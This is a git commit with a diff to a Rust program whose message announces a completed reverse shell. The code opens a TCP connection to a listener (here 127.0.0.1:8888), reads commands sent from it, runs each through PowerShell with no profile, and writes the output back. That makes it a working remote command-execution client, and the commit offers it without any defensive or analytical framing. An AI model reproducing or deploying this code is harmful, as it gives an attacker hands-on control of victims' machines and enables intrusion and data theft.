ffb95094bd1a3ee146a7a10597998910e8ea0939
Vitalii <vetajika@gmail.com>
2023-04-24 17:19:20 +0300

    Completed reverse shell with powershell scripts execution

--- src/main.rs
+++ src/main.rs
@@ -1,27 +1,39 @@
+use std::fmt::Debug;
 use std::io::{Read, Write};
 use std::net::TcpStream;
-use std::process::Command;
+use powershell_script::PsScriptBuilder;
 
 fn main() {
     let ip_address: String = String::from("127.0.0.1:8888");
+
+    let ps = PsScriptBuilder::new()
+        .no_profile(true)
+        .non_interactive(true)
+        .hidden(false)
+        .print_commands(false)
+        .build();
+
     match TcpStream::connect(&ip_address) {
         Ok(mut stream) => {
             println!("Successfully connected to {}", stream.peer_addr().unwrap());
 
+            let mut buf = [0; 1024];
             loop {
-                let mut data: Vec<u8> = vec![];
-                //getting from server data
-                match stream.read_to_end(&mut data) {
-                    Ok(_) => {
-                        print!("Ok");
-                        if !data.is_empty() {
-                            let command = String::from_utf8(data).unwrap();
-                            let output = Command::new("cmd")
-                                .arg(command)
-                                .output()
-                                .expect("Fail");
+                match stream.read(&mut buf) {
+                    Ok(bytes_read) => {
+                        if bytes_read == 0 {
+                            break;
+                        }
+                        let command = std::str::from_utf8(&buf[..bytes_read]).unwrap();
 
-                            stream.write(String::from_utf8(output.stdout).unwrap().as_bytes()).unwrap();
+                        match ps.run(command) {
+                            Ok(result) => {
+                                let output = result.stdout().unwrap();
+                                stream.write(output.as_bytes()).unwrap();
+                            }
+                            Err(e) => {
+                                stream.write(e.to_string().as_bytes()).unwrap();
+                            }
                         }
                     }
                     Err(e) => {}
@@ -32,4 +44,6 @@ fn main() {
             println!("Error {}", e)
         }
     }
+
+    eprintln!("Disconnected")
 }
